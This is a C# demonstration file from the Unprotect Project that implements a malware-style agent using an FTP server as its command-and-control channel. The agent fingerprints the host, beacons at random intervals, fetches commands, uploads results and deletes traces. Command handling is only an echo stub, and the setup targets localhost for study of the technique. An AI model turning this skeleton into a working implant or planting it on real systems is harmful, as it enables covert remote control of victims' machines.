/*
 * =========================================================================================
 * www.unprotect.it (Unprotect Project)
 * Author:   Jean-Pierre LESUEUR (@DarkCoderSc)
 * =========================================================================================
 */

/*
 * Quick Start with Docker:
 * 
 *  > `docker pull stilliard/pure-ftpd`
 *  
 *  Unsecure FTP Server:
 *      > `docker run -d --name ftpd_server -p 21:21 -p 30000-30009:30000-30009 -e "PUBLICHOST: 127.0.0.1" -e "ADDED_FLAGS=-E -A -X -x" -e FTP_USER_NAME=dark -e FTP_USER_PASS=toor -e FTP_USER_HOME=/home/dark stilliard/pure-ftpd`
 * 
 *  "Secure" FTP Server (TLS):
 *      > `docker run -d --name ftpd_server -p 21:21 -p 30000-30009:30000-30009 -e "PUBLICHOST: 127.0.0.1" -e "ADDED_FLAGS=-E -A -X -x --tls=2" -e FTP_USER_NAME=dark -e FTP_USER_PASS=toor -e FTP_USER_HOME=/home/dark -e "TLS_CN=localhost" -e "TLS_ORG=gogopando" -e "TLS_C=FR" stilliard/pure-ftpd`
 *      
 *      
 *  /!\ DO NOT EXPOSE THE FTP SERVER TO LAN / WAN /!\   
 */

using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Text;

class Program
{    
    public static Guid AgentSession = Guid.NewGuid();

    // EDIT HERE BEGIN ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    public static readonly string FtpHost = "127.0.0.1";
    public static readonly string FtpUser = "dark";
    public static readonly string FtpPwd = "toor";
    public static readonly bool FtpSecure = false;

    public static readonly int BeaconDelayMin = 500;
    public static readonly int BeaconDelayMax = 1000;
    // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool GetVolumeInformation(
        string lpRootPathName,
        StringBuilder lpVolumeNameBuffer,
        int nVolumeNameSize,
        out uint lpVolumeSerialNumber,
        out uint lpMaximumComponentLength,
        out uint lpFileSystemFlags,
        StringBuilder lpFileSystemNameBuffer,
        int nFileSystemNameSize
    );

    public static CancellationTokenSource CancellationTokenSource = new();

    /// <summary>
    /// The FtpHelper class is a utility in C# designed to streamline the application of the FTP protocol.
    /// This is accomplished through abstraction and simplification of the built-in WebRequest class,
    /// providing users with a more intuitive and manageable interface for FTP operations.
    /// 
    /// Supported operations:
    ///     * Session Actions
    ///     * Stream Upload (Generic)
    ///     * String Upload
    ///     * Stream Download (Generic)
    ///     * String Download
    ///     * Create Directory
    ///     * Delete File
    ///     * Enumerate Directory Files
    /// </summary>
    public class FtpHelper
    {
        public string Host;
        public string Username;
        private string Password;
        private bool Secure;

        public FtpHelper(string host, string username, string password, bool secure)
        {
            this.Host = host;
            this.Username = username;
            this.Password = password;
            this.Secure = secure;
        }

        private FtpWebRequest NewRequest(string? uri)
        {
            // Microsoft no longer recommends using "WebRequest" for FTP operations and advises opting for third-party components
            // specialized in this domain. However, for the sake of this demonstration, the built-in function was deemed convenient.
#pragma warning disable SYSLIB0014
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create($"ftp://{this.Host}/{uri ?? ""}");
#pragma warning restore SYSLIB0014

            request.Credentials = new NetworkCredential(this.Username, this.Password);

            request.UsePassive = true;
            request.UseBinary = true;
            request.KeepAlive = true;
            request.EnableSsl = this.Secure;

            return request;
        }

        public void UploadData(Stream data, string destFilePath)
        {
            FtpWebRequest request = this.NewRequest(destFilePath);

            request.Method = WebRequestMethods.Ftp.UploadFile;

            using Stream requestStream = request.GetRequestStream();

            data.CopyTo(requestStream);
        }

        public void UploadString(string content, string destFilePath)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(content);

            using MemoryStream stream = new(bytes);

            UploadData(stream, destFilePath);
        }

        public Stream DownloadData(string remoteFilePath)
        {
            FtpWebRequest request = this.NewRequest(remoteFilePath);

            request.Method = WebRequestMethods.Ftp.DownloadFile;

            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            Stream stream = response.GetResponseStream();

            return stream;
        }

        public string DownloadString(string remoteFilePath)
        {
            using Stream stream = DownloadData(remoteFilePath);

            using StreamReader reader = new StreamReader(stream);

            return reader.ReadToEnd();
        }

        private void ExecuteFTPCommand(string remoteDirectoryPath, string command)
        {
            FtpWebRequest request = this.NewRequest(remoteDirectoryPath);

            request.Method = command;

            using FtpWebResponse resp = (FtpWebResponse)request.GetResponse();
        }

        public void CreateDirectory(string remoteDirectoryPath)
        {
            ExecuteFTPCommand(remoteDirectoryPath, WebRequestMethods.Ftp.MakeDirectory);
        }

        public void DeleteFile(string remoteDirectoryPath)
        {
            ExecuteFTPCommand(remoteDirectoryPath, WebRequestMethods.Ftp.DeleteFile);
        }
    }

    /// <summary>
    /// This function generates a unique machine ID by hashing the primary Windows hard drive's serial number and converting it into
    /// a pseudo-GUID format.
    /// It is specifically designed for Microsoft Windows operating systems. However, you are encouraged to adapt this algorithm for 
    /// other operating systems and/or employ different strategies to derive a unique machine ID
    /// (e.g., using the MAC Address, CPU information, or saving a one-time generated GUID in the Windows registry or a file).    
    /// </summary>
    /// <returns>A unique machine ID in GUID format.</returns>
    [SupportedOSPlatform("windows")]
    public static Guid GetMachineId()
    {
        string candidate = "";

        string mainDrive = Environment.GetFolderPath(Environment.SpecialFolder.System)[..3];

        const int MAX_PATH = 260;

        StringBuilder lpVolumeNameBuffer = new(MAX_PATH + 1);        
        StringBuilder lpFileSystemNameBuffer = new(MAX_PATH + 1);

        bool success = GetVolumeInformation(
            mainDrive,
            lpVolumeNameBuffer,
            lpVolumeNameBuffer.Capacity,
            out uint serialNumber,
            out uint _,
            out uint _,
            lpFileSystemNameBuffer,
            lpFileSystemNameBuffer.Capacity
         );

        if (success)
            candidate += serialNumber.ToString();        

        using MD5 md5 = MD5.Create();

        byte[] hash = md5.ComputeHash(Encoding.ASCII.GetBytes(candidate));

        return new Guid(Convert.ToHexString(hash));
    }

    public static void Main(string[] args)
    {       
        // Important Notice: The delegate below renders the current application susceptible to
        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
        // This configuration was implemented to accommodate self-signed certificates.
        // However, it is strongly advised not to employ this approach in a production environment
        // if SSL/TLS security is expected.
        if (FtpSecure)
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ///

        // Adapt "GetMachineId" for cross-platform support.
        AgentSession = GetMachineId();

        List<Thread> daemons = new List<Thread>();
        ///

        // This thread is tasked with handling C2 commands and dispatching responses. Note that this sample utilizes a
        // single-threaded approach, but it's possible to distribute the operations across multiple threads to enhance
        // performance.
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            FtpHelper ftp = new(FtpHost, FtpUser, FtpPwd, FtpSecure);

            string contextPath = $"{AgentSession.ToString()}/{Environment.UserName}@{Environment.MachineName}";
            string commandFile = $"{contextPath}/__command__";

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                string? command = null;
                try
                {
                    // Retrieve dedicated command
                    try
                    {
                        command = ftp.DownloadString(commandFile);
                    }
                    catch { };

                    // Create remote directory tree
                    try
                    {
                        ftp.CreateDirectory(AgentSession.ToString());

                        ftp.CreateDirectory(contextPath);
                    }
                    catch { };

                    // Echo-back command result
                    if (!String.IsNullOrEmpty(command))
                    {
                        // ... PROCESS ACTION / COMMAND HERE ... //
                        // ...

                        string commandResult = $"This is just a demo, so I echo-back the command: `{command}`.";

                        // ...
                        // ... PROCESS ACTION / COMMAND HERE ... //

                        string resultFile = $"{contextPath}/result.{DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss")}";

                        ftp.UploadString(commandResult, resultFile);

                        // Delete the command file when processed
                        try
                        {
                            ftp.DeleteFile(commandFile);
                        }
                        catch { }
                    }

                    ///
                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax));
                }
                catch (Exception ex) {
                    Console.WriteLine(ex.Message);
                };
            }
        }));
                       
        // The action to handle a CTRL+C signal on the console has been registered.
        // When triggered, it will instruct any associated cancellation tokens to properly
        // shut down their associated daemons.
        Console.CancelKeyPress += (sender, cancelEventArgs) =>
        {
            CancellationTokenSource.Cancel(); // Signal tokens that application needs to be closed.

            cancelEventArgs.Cancel = true; // Cancel default behaviour
        };

        // Start daemons
        foreach (Thread daemon in daemons)
            daemon.Start(CancellationTokenSource.Token);

        // Keep process running until CTRL+C.
        CancellationToken token = CancellationTokenSource.Token;
        while (!token.IsCancellationRequested)
            Thread.Sleep(1000);

        // Wait for daemons to join main thread
        foreach (Thread daemon in daemons)
            daemon.Join();           
    }
}